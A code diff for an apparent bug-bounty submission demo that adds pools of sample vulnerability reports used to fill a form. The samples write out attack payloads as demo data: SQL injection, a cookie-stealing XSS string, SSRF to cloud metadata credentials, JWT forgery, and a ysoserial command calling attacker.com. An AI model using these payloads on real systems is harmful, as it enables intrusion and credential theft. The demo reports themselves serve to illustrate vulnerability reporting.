@@ -236,36 +236,131 @@ document.getElementById("reportForm").addEventListener("submit", async (e) => {
   btn.querySelector(".btn-loading").style.display = "none";
 });
 
-function fillGoodReport() {
-  document.getElementById("bugTitle").value = "SQL Injection in /api/users search endpoint";
-  document.querySelector('input[name="severity"][value="critical"]').checked = true;
-  document.getElementById("bugDescription").value = `Steps to reproduce:
-1. Navigate to /api/users?search=test
-2. Inject payload: /api/users?search=test' OR '1'='1' --
-3. The query returns all users in the database
+// Demo report pools — picks a random one each click
+const GOOD_REPORTS = [
+  {
+    title: "SQL Injection in /api/users search endpoint",
+    severity: "critical",
+    description: "Steps to reproduce:\n1. Navigate to /api/users?search=test\n2. Inject payload: /api/users?search=test' OR '1'='1' --\n3. The query returns all users in the database\n\nImpact: Full database read access. An attacker can extract all user credentials, PII, and payment information.\n\nProof of Concept:\ncurl \"https://app.example.com/api/users?search=test%27%20OR%20%271%27%3D%271%27%20--\"\n\nThe vulnerable code is at line 142 in src/controllers/users.js.\nRecommended fix: Use parameterized queries with prepared statements.",
+    wallet: "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD38",
+  },
+  {
+    title: "Stored XSS via profile bio field",
+    severity: "critical",
+    description: "Steps to reproduce:\n1. Go to /settings/profile\n2. In the Bio field, enter: <img src=x onerror=alert(document.cookie)>\n3. Save profile and visit /user/attacker\n4. JavaScript executes in the victim's browser\n\nImpact: Session hijacking, credential theft, phishing via injected content. Any user viewing the attacker's profile has their session token stolen.\n\nProof of Concept: The payload above triggers an alert. A real attack would exfiltrate cookies to an external server.\n\nAffected endpoint: POST /api/profile/update\nRoot cause: Bio field is rendered without HTML sanitization.\n\nRecommended fix: Use DOMPurify or escape HTML entities before rendering user content.",
+    wallet: "0xA1B2C3D4E5F60718293a4b5c6d7e8f9001234567",
+  },
+  {
+    title: "IDOR allows accessing other users' payment history",
+    severity: "high",
+    description: "Steps to reproduce:\n1. Log in as user A (id=100)\n2. Send GET /api/payments?userId=101\n3. The API returns user B's full payment history including amounts, dates, and card last-4\n\nImpact: Any authenticated user can view any other user's payment history. This exposes financial PII for all users.\n\nProof of Concept:\ncurl -H \"Authorization: Bearer <token_A>\" \"https://app.example.com/api/payments?userId=101\"\n\nThe server does not verify that the requesting user owns the requested userId.\n\nRecommended fix: Add authorization check: if (req.user.id !== req.query.userId) return 403.",
+    wallet: "0xFEDCBA9876543210fedcba9876543210FEDCBA98",
+  },
+  {
+    title: "SSRF in webhook URL validation allows internal network scanning",
+    severity: "critical",
+    description: "Steps to reproduce:\n1. Go to /settings/webhooks\n2. Add a new webhook with URL: http://169.254.169.254/latest/meta-data/\n3. Save and trigger the webhook\n4. The server fetches the AWS metadata endpoint and returns instance credentials\n\nImpact: Full AWS credential theft via SSRF. Attacker gains IAM role credentials, can pivot to S3, RDS, and other AWS services.\n\nProof of Concept:\ncurl -X POST /api/webhooks -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}'\n\nRoot cause: No URL validation against internal/metadata IPs.\n\nRecommended fix: Block RFC1918 ranges, link-local (169.254.x.x), and cloud metadata IPs.",
+    wallet: "0x1111222233334444555566667777888899990000",
+  },
+  {
+    title: "Authentication bypass via JWT algorithm confusion",
+    severity: "critical",
+    description: "Steps to reproduce:\n1. Capture a valid JWT from the login response\n2. Decode the header and change alg from RS256 to HS256\n3. Sign the modified token using the server's public key as the HMAC secret\n4. Send requests with the forged token\n5. The server accepts it as valid\n\nImpact: Complete authentication bypass. Any user can forge admin tokens.\n\nProof of Concept:\npython3 jwt_tool.py <token> -X a -pk public.pem\n\nThe server's JWT library accepts both RS256 and HS256 without pinning the algorithm.\n\nRecommended fix: Pin the algorithm in verification: jwt.verify(token, key, { algorithms: ['RS256'] })",
+    wallet: "0xAABBCCDDEEFF00112233445566778899AABBCCDD",
+  },
+  {
+    title: "Remote Code Execution via unsafe deserialization in /api/import",
+    severity: "critical",
+    description: "Steps to reproduce:\n1. Craft a malicious serialized Java object using ysoserial\n2. POST it to /api/import with Content-Type: application/x-java-serialized-object\n3. The server deserializes the payload and executes arbitrary commands\n\nImpact: Full server compromise. Attacker can execute arbitrary system commands.\n\nProof of Concept:\njava -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/pwned' | base64\ncurl -X POST /api/import -d @payload.bin\n\nAffected version: 2.3.1 (uses commons-collections 3.2.1)\nRoot cause: ObjectInputStream.readObject() on untrusted input.\n\nRecommended fix: Use a whitelist-based deserialization filter or switch to JSON.",
+    wallet: "0x5566778899AABBCCDDEEFF0011223344556677FF",
+  },
+];
 
-Impact: Full database read access. An attacker can extract all user credentials, PII, and payment information. This is a critical authentication bypass vulnerability.
+const MEDIUM_REPORTS = [
+  {
+    title: "Open redirect in /auth/callback allows phishing",
+    severity: "medium",
+    description: "Steps to reproduce:\n1. Visit: https://app.example.com/auth/callback?redirect=https://evil.com/fake-login\n2. After OAuth login, user is redirected to the attacker's site\n3. Attacker's page mimics the login page and steals credentials\n\nImpact: Phishing attacks using the trusted domain.\n\nAffected endpoint: GET /auth/callback\nThe redirect parameter is not validated against a whitelist.\n\nRecommended fix: Validate redirect URL against allowed origins, or only allow relative paths.",
+    wallet: "0x3344556677889900AABBCCDDEEFF001122334455",
+  },
+  {
+    title: "Rate limiting bypass via X-Forwarded-For header spoofing",
+    severity: "medium",
+    description: "Steps to reproduce:\n1. Send POST /api/login with invalid credentials (rate limited after 5 attempts)\n2. Add header: X-Forwarded-For: 1.2.3.4\n3. Rate limit resets, attacker can continue brute-forcing\n4. Cycle through random IPs to bypass entirely\n\nImpact: Credential brute-force attacks against any user account.\n\nAffected endpoint: POST /api/login\n\nRecommended fix: Trust X-Forwarded-For only from known proxy IPs.",
+    wallet: "0xABCDEF0123456789ABCDEF0123456789ABCDEF01",
+  },
+  {
+    title: "Sensitive data exposure in error stack traces",
+    severity: "medium",
+    description: "Steps to reproduce:\n1. Send a malformed request to POST /api/checkout with invalid JSON\n2. Server returns 500 with full stack trace including:\n   - Database connection string with credentials\n   - Internal file paths\n   - Node.js version and dependency versions\n\nImpact: Information disclosure useful for targeted attacks.\n\nAffected endpoint: All endpoints (global error handler leaks details)\n\nRecommended fix: Set NODE_ENV=production, use a custom error handler that returns generic messages.",
+    wallet: "0x9988776655443322110099887766554433221100",
+  },
+  {
+    title: "CSRF on account email change endpoint",
+    severity: "high",
+    description: "Steps to reproduce:\n1. Victim is logged into app.example.com\n2. Victim visits attacker's page with a hidden form that POSTs to /api/account/email\n3. Victim's email is changed to attacker@evil.com\n4. Attacker triggers password reset and takes over the account\n\nImpact: Full account takeover via CSRF + password reset chain.\n\nAffected endpoint: POST /api/account/email\nNo CSRF token or re-authentication required.\n\nRecommended fix: Add CSRF tokens or require current password for email changes.",
+    wallet: "0x1234ABCD5678EFAB1234ABCD5678EFAB1234ABCD",
+  },
+  {
+    title: "Privilege escalation via role parameter in registration",
+    severity: "high",
+    description: "Steps to reproduce:\n1. Intercept the POST /api/register request\n2. Add role=admin to the request body\n3. The new account is created with admin privileges\n\nImpact: Any user can self-escalate to admin during registration.\n\nProof of Concept:\ncurl -X POST /api/register -d '{\"email\":\"attacker@evil.com\",\"password\":\"test\",\"role\":\"admin\"}'\n\nRoot cause: Mass assignment - the registration endpoint copies all request fields to the user model.\n\nRecommended fix: Whitelist allowed fields: only accept email, password, name. Ignore role.",
+    wallet: "0xAAAABBBBCCCCDDDDEEEEFFFF0000111122223333",
+  },
+];
 
-Proof of Concept:
-curl "https://app.example.com/api/users?search=test%27%20OR%20%271%27%3D%271%27%20--"
+const BAD_REPORTS = [
+  {
+    title: "something might be broken",
+    severity: "low",
+    description: "I'm not sure but maybe the site is slow sometimes. Could be a bug?",
+    wallet: "0xDEADBEEF000000000000000000000000DeAdBeEf",
+  },
+  {
+    title: "website looks weird",
+    severity: "low",
+    description: "the colors are off on mobile, not sure if this is a security thing",
+    wallet: "0x0000000000000000000000000000000000000001",
+  },
+  {
+    title: "error message",
+    severity: "medium",
+    description: "i got an error once but didnt screenshot it. maybe you should look into it?",
+    wallet: "0x0000000000000000000000000000000000000002",
+  },
+  {
+    title: "your site might have bugs",
+    severity: "high",
+    description: "heard from a friend that sites like yours usually have vulnerabilities. you should probably check things.",
+    wallet: "0x0000000000000000000000000000000000000003",
+  },
+  {
+    title: "placeholder test report",
+    severity: "low",
+    description: "testing 123. this is a test. just checking if the form works.",
+    wallet: "0x0000000000000000000000000000000000000004",
+  },
+];
 
-The vulnerable code is at line 142 in src/controllers/users.js:
-const query = \`SELECT * FROM users WHERE name LIKE '%\${search}%'\`;
+function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
 
-Recommended fix: Use parameterized queries with prepared statements.`;
-  document.getElementById("reporterWallet").value = "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD38";
-};
+function fillForm(r) {
+  document.getElementById("bugTitle").value = r.title;
+  document.querySelector('input[name="severity"][value="' + r.severity + '"]').checked = true;
+  document.getElementById("bugDescription").value = r.description;
+  document.getElementById("reporterWallet").value = r.wallet;
+}
 
-function fillBadReport() {
-  document.getElementById("bugTitle").value = "something might be broken";
-  document.querySelector('input[name="severity"][value="low"]').checked = true;
-  document.getElementById("bugDescription").value = "I'm not sure but maybe the site is slow sometimes. Could be a bug?";
-  document.getElementById("reporterWallet").value = "0xDEADBEEF000000000000000000000000DeAdBeEf";
-};
+function fillGoodReport() { fillForm(pick(GOOD_REPORTS)); }
+function fillMediumReport() { fillForm(pick(MEDIUM_REPORTS)); }
+function fillBadReport() { fillForm(pick(BAD_REPORTS)); }
+function fillRandomReport() { fillForm(pick([...GOOD_REPORTS, ...MEDIUM_REPORTS, ...BAD_REPORTS])); }
 
 // Bind buttons (no inline onclick — CSP blocks them)
 document.getElementById("demoGood").addEventListener("click", fillGoodReport);
+document.getElementById("demoMedium").addEventListener("click", fillMediumReport);
 document.getElementById("demoBad").addEventListener("click", fillBadReport);
+document.getElementById("demoRandom").addEventListener("click", fillRandomReport);
 document.querySelectorAll(".filter-btn").forEach(btn => {
   btn.addEventListener("click", () => setFilter(btn.dataset.filter));
 });
